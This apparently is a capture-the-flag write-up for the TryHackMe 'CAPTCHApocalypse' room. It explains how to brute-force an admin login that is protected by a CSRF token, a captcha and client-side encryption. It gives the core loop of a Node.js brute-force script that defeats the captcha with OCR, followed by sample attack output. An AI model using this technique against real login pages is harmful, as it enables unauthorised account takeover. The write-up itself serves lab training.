---
layout: post
title: TryHackMe - "CAPTCHApocalypse"
categories: Challenges
tags: red-team pen-testing 
---
[Link to the challenge](https://tryhackme.com/room/captchapocalypse)

## Intro

We are targeting a website displaying a login form. We know username is "admin", but the password isn't easily guessable, so we need to perform a bruteforce attack using a dictionary (we're told the dictionary to use is "rockyou.txt," specifically the first 100 lines). However, the login form isn't easily crackable with common "pre-packaged" attacks because we have three elements protecting it:

- Upon the client's first request to the main page, the server sends the <u>session</u> number to the client via a cookie (see response header). The client must therefore send this cookie in each request. It remains fixed, so it's not a major problem.

- There's also a <u>CSRF token</u>, contained in the login html page (useful for preventing CSRF attacks). This changes with each failed login attempt, so for each failed login attempt, we need to keep track of this string and send it back to the server, sending the login POST.

- The login page also requires the famous <u>captcha</u>: an image displaying a number, which must be sent back to the server in the login POST: for each login attempt, we must recognize the alphanumerical text shown in the image using an OCR function (we can use the "tesseract" library) and send it to the server along with the other parameters (username, password, csrf-token).

Because of these three protective elements, we can't simply make multiple POST requests containing the various words from the dictionary to be used as passwords for "admin" user, perhaps using Hydra or other automated brute-forcing methods. Instead, we need to program our custom script, which for each login attempt will send to the server the session ID, the anti-CSRF token (which changes with each attempt, so it must be extracted from a new login page, for each cycle), and the corresponding captcha.

## Encryption and Javascript

In addition to what we said earlier, there is one more thing to note: the target web application is programmed to send the query containing the four parameters (username, password, csrf-token, captcha_input) in encrypted form using "forge" JavaScript library (forge.min.js), called by login script (script.js), so this adds complexity to our brute-force attack.

The encryption is asymmetric, but this isn't a problem because the client-side JavaScript login script (viewable in our browser) shows us the two keys (private key for decryption, and public key for encryption). By looking at source code, we can see how login process works, which retrieves the strings contained in the form fields (username, password, csrf-token, captcha_input), packages them into a query string, which is transformed into a base64 string, and then it's encrypted, and sent to the server with a POST.
The response that comes from the server will have to be treated inversely: there will be decryption, base64 decoding, and then treatment of the different result cases (successful login, failed login, invalid captcha). Note: login request/response content type is JSON. 

Since the client-side login logic is contained almost exclusively in the JavaScript script, which extracts all fields from login form and sends them in encrypted form to the server, it will be more convenient to program our custom brute-forcing script in JavaScript itself, using Node.js technology, which allows the execution of JavaScript as a command-line script from terminal, just as we would if we were calling a Python script.

## Brute-force script

We do not present the complete script of all the subfunctions to avoid giving away any easy spoilers, but only the fundamental part that manages the logic of our bruteforcing attack.

    console.log("Loading dictionary...");
    var words = await readDictionaryFile();
    console.log("Done.");	   
    console.log("Requesting web index...");
    var index_page_text = await requestIndexPage();
    console.log("Session ID:", session_id); // session_id is extracted from response header

    var csrf_match = index_page_text.match(csrf_regexp);
    var csrf_str = csrf_match[1];
    var captcha_str = await requestCaptcha();
    captcha_str = captcha_str.trim();
    var result;
    var i = 0;
    for (let word of words) {
        result = 2;
        while (result == 2) { // while captcha is not recognized we will retry login with the same password and a new captcha
            console.log(i + ";admin:" + word + ";csrf:" + csrf_str + ";captcha:" + captcha_str);
            result = await custom_login(login_url, session_id, username, word, csrf_str, captcha_str);
            if (result == 0) { // login successful 
                break;
            }
            else if (result == 1) { // login failed
                let login_page_text = await requestLoginPage();
                csrf_match = login_page_text.match(csrf_regexp);
                csrf_str = csrf_match[1];
                captcha_str = await requestCaptcha();
                captcha_str = captcha_str.trim();
            }
            else if (result == 2) { // captcha invalid (not recognized), we only request another captcha
                captcha_str = await requestCaptcha();
                captcha_str = captcha_str.trim();
            }
            else if (result > 2){ // connection error
                break;
            }
        }
        if ((result == 0) || (result > 2) || (i > 100)) {
            break
        }
        i++;
    }

In summary, the first request to the index server page is mainly to capture the session number which will remain fixed throughout the attack, and also capture the first csrf token (and captcha), which we use on the first login attempt.

After that, the cycle begins: for each _word_ in the dictionary (rockyou.txt), we do POST login request sending username, password (_word_), csrf_token, captcha string, and cookie header with session_id, calling our "custom_login" function, which is very similar to the original login() function defined in "script.js" file, and it returns a result based on the server response.

- If result of our "custom_login" is 0 (successful login) we break the loop 
- If result is 1 (failed login) we move on, requesting a new login page in order to extract a new csrf token, and requesting a new captcha from the server, and then making a new POST login attempt, etc. etc..
- If result is 2 (invalid captcha), we request to the server a new captcha, without requesting a new login page, we recognize it using OCR technique, and we retry login with the same password until captcha will be recognized correctly. This is the meaning of "while (result == 2)" statement.

In other words, the "for" loop, which attempts a login for each word in the dictionary, continues to run within "while" sub-loop if captcha is not recognized correctly; otherwise, it proceed normally with the next password from dictionary, continuing with the "for" loop.

By implementing the script (completely, with sub-functions, etc.) and running our script, the password will be found within a fairly reasonable amount of time. Then, with that correct password, you'll need to log in with your browser to access to admin account (basically, a simple page will appear that will display the flag).

We show only the first lines of the script's output without going any further to avoid spoilers.

    0;admin:123456;csrf:77fc53b6febe1be218b63094ad3f29dcc016821e183e0625075263c4150bbccc;captcha:BHDG3
    CAPTCHA incorrect.
    0;admin:123456;csrf:77fc53b6febe1be218b63094ad3f29dcc016821e183e0625075263c4150bbccc;captcha:IB259
    CAPTCHA incorrect.
    0;admin:123456;csrf:77fc53b6febe1be218b63094ad3f29dcc016821e183e0625075263c4150bbccc;captcha:4UBKZ
    Login failed
    1;admin:12345;csrf:3b513619b95f5142e386291abaa67b514b34b5cea0cd6fb772eba536167805b2;captcha:LAGNX
    CAPTCHA incorrect.
    1;admin:12345;csrf:3b513619b95f5142e386291abaa67b514b34b5cea0cd6fb772eba536167805b2;captcha:T8SUM
    CAPTCHA incorrect.
    1;admin:12345;csrf:3b513619b95f5142e386291abaa67b514b34b5cea0cd6fb772eba536167805b2;captcha:KsXaY
    Login failed
    2;admin:123456789;csrf:09df82f29e3fc313bc586e62de97b2270fe50813f75065d02a293fdb19eef9ba;captcha:H94UV
    Login failed
    3;admin:password;csrf:27a2d497e4e696fd10cfeca33831c18ebd88320c4e9d5ab216970606f29100e6;captcha:QEVSM
    CAPTCHA incorrect.
    3;admin:password;csrf:27a2d497e4e696fd10cfeca33831c18ebd88320c4e9d5ab216970606f29100e6;captcha:Y8PJ4
    Login failed
    4;admin:iloveyou;csrf:9479c2ef0ace5ede25c7121d036a35f2767c73606ffb61d1890b7f50f46cbd08;captcha:2DE7S
    Login failed
    5;admin:princess;csrf:58ce68c397d00eba5ecab28e6789af05e1c6743116a29413f3b0ef79f2e64616;captcha:8X9CG
    Login failed
    6;admin:1234567;csrf:986cacb9aa69b46503e680c14ed02677eec0d09a30bcf4f2ff67b0078fbb36ce;captcha:KNZOT
    CAPTCHA incorrect.
    6;admin:1234567;csrf:986cacb9aa69b46503e680c14ed02677eec0d09a30bcf4f2ff67b0078fbb36ce;captcha:voseT
    CAPTCHA incorrect.
    6;admin:1234567;csrf:986cacb9aa69b46503e680c14ed02677eec0d09a30bcf4f2ff67b0078fbb36ce;captcha:SBXLY
    CAPTCHA incorrect.
    6;admin:1234567;csrf:986cacb9aa69b46503e680c14ed02677eec0d09a30bcf4f2ff67b0078fbb36ce;captcha:T2BMP
    Login failed
    7;admin:rockyou;csrf:909b59b325240621c447e41466a771431a5dbb4bebfc9953af6124bf3bb4cb75;captcha:2NSPG
    CAPTCHA incorrect.
    7;admin:rockyou;csrf:909b59b325240621c447e41466a771431a5dbb4bebfc9953af6124bf3bb4cb75;captcha:NSLPX
    Login failed
    8;admin:12345678;csrf:29aa40e2b4c54d5e6fcd757a4f43fc56b9667b29f58e3ca85bc55105175db4fd;captcha:75VUT
    CAPTCHA incorrect.
    8;admin:12345678;csrf:29aa40e2b4c54d5e6fcd757a4f43fc56b9667b29f58e3ca85bc55105175db4fd;captcha:YSIRK
    CAPTCHA incorrect.
    8;admin:12345678;csrf:29aa40e2b4c54d5e6fcd757a4f43fc56b9667b29f58e3ca85bc55105175db4fd;captcha:E6Jav
    CAPTCHA incorrect.
    8;admin:12345678;csrf:29aa40e2b4c54d5e6fcd757a4f43fc56b9667b29f58e3ca85bc55105175db4fd;captcha:TFDES
    CAPTCHA incorrect.
    8;admin:12345678;csrf:29aa40e2b4c54d5e6fcd757a4f43fc56b9667b29f58e3ca85bc55105175db4fd;captcha:B53GA
    Login failed
    9;admin:abc123;csrf:6c5bb49ee74ab0aabeeec5befe9b9df3ca00c4d5c7cf31ae8237f0ddc3556cfa;captcha:MKC3
    CAPTCHA incorrect.
    9;admin:abc123;csrf:6c5bb49ee74ab0aabeeec5befe9b9df3ca00c4d5c7cf31ae8237f0ddc3556cfa;captcha:DIKBN
    CAPTCHA incorrect.
    9;admin:abc123;csrf:6c5bb49ee74ab0aabeeec5befe9b9df3ca00c4d5c7cf31ae8237f0ddc3556cfa;captcha:2THaD
    CAPTCHA incorrect.
    9;admin:abc123;csrf:6c5bb49ee74ab0aabeeec5befe9b9df3ca00c4d5c7cf31ae8237f0ddc3556cfa;captcha:NZAFS
    Login failed
    10;admin:nicole;csrf:5191abe3c4999e00e99b08d1543f5c47412fb42b9596180f2b7b7fb0087e205e;captcha:HEK32
    CAPTCHA incorrect.
    10;admin:nicole;csrf:5191abe3c4999e00e99b08d1543f5c47412fb42b9596180f2b7b7fb0087e205e;captcha:GFUK2
    Login failed
    11;admin:daniel;csrf:5c4d65f2f195884d76c59bbad2beb6b8512e243d0013d3929341fe2c7291ff2b;captcha:HoaMA
    CAPTCHA incorrect.